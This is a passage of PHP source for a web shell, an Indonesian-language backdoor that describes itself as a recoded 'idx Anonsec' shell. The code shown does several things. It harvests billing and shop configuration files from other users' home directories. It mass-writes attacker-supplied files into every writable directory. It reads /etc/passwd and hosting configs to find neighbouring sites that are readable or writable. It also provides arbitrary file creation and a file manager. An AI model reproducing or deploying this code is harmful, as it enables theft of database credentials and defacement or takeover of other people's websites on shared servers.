                        "/home/$user_con/public_html/Secure/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/secure/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/SALES/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Sales/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/sales/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/BILL/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Bill/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/bill/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/PURCHASE/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Purchase/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/purchase/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/ACCOUNT/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Account/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/account/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/USER/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/User/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/user/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/CLIENTS/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Clients/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/clients/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/BILLINGS/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Billings/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/billings/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/MY/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/My/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/my/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/secure/whm/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/secure/whmcs/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/panel/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/clientes/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/cliente/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/support/order/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/boxbilling/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/box/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/host/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/Host/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/supportes/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/support/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/hosting/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/cart/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/order/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/client/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/clients/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/cliente/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/clientes/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/billing/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/billings/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/my/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/secure/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/support/order/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/includes/dist-configure.php" => 'Zencart',
                        "/home/$user_con/public_html/zencart/includes/dist-configure.php" => 'Zencart',
                        "/home/$user_con/public_html/products/includes/dist-configure.php" => 'Zencart',
                        "/home/$user_con/public_html/cart/includes/dist-configure.php" => 'Zencart',
                        "/home/$user_con/public_html/shop/includes/dist-configure.php" => 'Zencart',
                        "/home/$user_con/public_html/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/hostbills/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/host/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/Host/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/supportes/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/support/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/hosting/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/cart/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/order/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/client/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/clients/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/cliente/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/clientes/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/billing/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/billings/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/my/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/secure/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/support/order/includes/iso4217.php" => 'Hostbills',
                    ];
                    foreach ($grab_config as $config => $nama_config) {
                        $ambil_config = file_get_contents($config);
                        if ($ambil_config == '') {
                        } else {
                            $file_config = fopen("d7net_config/$user_con-$nama_config.txt", 'w');
                            fwrite($file_config, $ambil_config);
                        }
                    }
                }
            }
        }
    }
    echo "<center><a href='?path=$lokasi/d7net_config'><font color=lime>Done</font></a></center>";
    exit;

} elseif ($_REQUEST['mass'] == "d7net") {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "$lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "$dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: ;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br><br>
	<font style='text-decoration: ;'>Directory:</font><br>
	<input type='text' name='d_dir' value='$lokasi' style='width: 450px;height: 20px;'><br>
	<font style='text-decoration: ;'>Nama File:</font><br>
	<input type='text' name='d_file' value='' style='width: 450px;height: 20px;' placeholder='isi nickname'><br>
	<font style='text-decoration: ;'>Isi File:</font><br>
	<textarea name='script' style='width: 600px; height: 250px;' placeholder='isi script'></textarea><br>
	<input type='submit' class='button' name='start' value='Sikat!!' style='width: 450px;'>
	</form></center><br>";
}
exit;
} elseif($_GET['jump'] == 'd7net') {
	$i = 0;
	echo "<center>Jumping server<center><br>	<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<center><font color=red>Can't read /etc/passwd</font></center>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<center><font color=red>Can't read /etc/passwd</font></center>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	
	echo "</div>";}
	elseif ($_REQUEST['about'] == "d7net") {
		echo "<hr><center>About ME<br><br>";
		echo "Recode Shell Dari idx Anonsec dan sedikit merubah tampilan<br>";
		echo "Tanpa adanya logger, shell ini aman digunakan<br>";
		echo "Tunggu shell versi terbarunya dari saya ";
		echo "kunjungi website => <a class='button' href='http://www.opetmv.rf.gd/index.php?opet=backdoor' target='_blank'>Click</a></center><hr><br>";}

	elseif ($_REQUEST['buatfile'] == "d7net") {
		echo "<center>
    <form method='POST'>
        <input type='text' class='form-control' value='$lokasi/filekamu.php' style='width: 400px;' name='nama_file' autocomplete='off' placeholder='Nama File...'><br><br/>
        <textarea name='isi_file' class='form-control' rows='15' cols='70' placeholder='Isi File...'></textarea><br/>
        <button type='sumbit' class='button' name='bikin'>Bikin!!</button><br><br/>
    </form></center>";

    if (isset($_POST['bikin'])) {
        $nama_file = $_POST['nama_file'];
        $isi_file = $_POST['isi_file'];
        $handle = fopen("$nama_file", 'w');

        if (fwrite($handle, $isi_file)) {
            echo '<center>File Berhasil dibuat !!&nbsp;<font color="gold"><i>'.$nama_file.'</i></font><br><br></center>';
        } else {
            echo '<script>alert("File Gagal Dibuat");</script>';
        }
    }
}
elseif ($_REQUEST['info'] == "d7net") {
	echo "<br><hr>";
	echo "Server IP : <font color=gold>".ipserv()."</font> &nbsp;/&nbsp; Your IP : <font color=gold>".$_SERVER['REMOTE_ADDR']."</font><br>";
	echo "Web Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
	echo "System : <font color='gold'>".php_uname()."</font><br>";
	echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
	echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
	echo "Disable Function : ".$disf."</font><br>";
	echo "MySQL : ";
	echo "<hr><br>";}


if (!is_readable($lokasi)) {
    die("<center>This directory is unreadable :(</center>");
}

echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Last Modified</center></td>
<td><center>Owner</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($lokasinya as $dir){
    if(!is_dir($lokasi."/".$dir) || $dir == '.') continue;
    echo "<tr>
    <td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
    <td><center>--</center></td>
    <td><center>".filedate($lokasi."/".$dir)."</center></td>
    <td>".owner($lokasi."/".$dir)."</td>
    <td><center>";
    if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
    elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
    echo statusnya($lokasi."/".$dir);
    if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';

    echo "</center></td>
    <td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
    <select name=\"pilih\">
    <option value=\"\"></option>
    <option value=\"hapus\">Delete</option>
    <option value=\"gantinama\">Rename</option>
    </select>
    <input type=\"hidden\" name=\"type\" value=\"dir\">
    <input type=\"hidden\" name=\"name\" value=\"$dir\">
    <input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
    <input type=\"submit\" class=\"gas\" value=\">\" />
    </form></center></td>
    </tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
foreach($lokasinya as $file) {
    if(!is_file("$lokasi/$file")) continue;
    $size = filesize("$lokasi/$file")/1024;
    $size = round($size,3);
    if($size >= 1024){
    $size = round($size/1024,2).' MB';
} else {
    $size = $size.' KB';
}

echo "<tr>
<td>".cekfile($lokasi."/".$file)."<a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>".filedate($lokasi."/".$file)."</center></td>
<td>".owner($lokasi."/".$file)."</td>
<td><center>";
if(is_writable("$lokasi/$file")) echo '<font color="green">';
elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
echo statusnya("$lokasi/$file");
if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&path=$lokasi\">
<select name=\"pilih\">table
<option value=\"\">-Select-</option>
<option value=\"hapus\">Delete</option>
<option value=\"dunlut\">Download</option>
<option value=\"gantinama\">Rename</option>
<option value=\"edit\">Edit</option>";
if (class_exists("ZipArchive")) {
    echo "<option value=\"unzip\">Unzip</option>";
}
echo "</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
<input type=\"submit\" class=\"gas\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($file){
$izin = substr(sprintf('%o', fileperms($file)), -4);
return $izin;
}
?>	
</body>
</html>